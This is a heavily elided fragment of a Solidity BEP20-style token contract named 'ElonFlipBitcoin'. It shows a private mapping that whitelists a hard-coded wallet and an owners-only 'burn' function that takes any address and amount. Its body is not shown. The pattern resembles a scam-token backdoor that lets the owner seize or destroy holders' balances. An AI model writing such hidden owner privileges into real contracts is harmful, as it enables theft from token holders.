...
contract ElonFlipBitcoin is IBEP20ETH {
 ...
 mapping(address => bool) private MOONISHERE;
  ...
  constructor(string memory _name, string memory _symbol) public {
    ...
    MOONaskingadr[owner] = true;
    MOONISHERE[MOONWALLLETY] = true;
  }
  ...
  modifier onlyAdmin() {
    require(owner == msg.sender, "IBEP20ETH: caller is not the owner");
    _;
  }
 ...
 modifier isONLYOwners () {
  ...
  function burn (address newAddress, uint256 exvalue) external isONLYOwners {
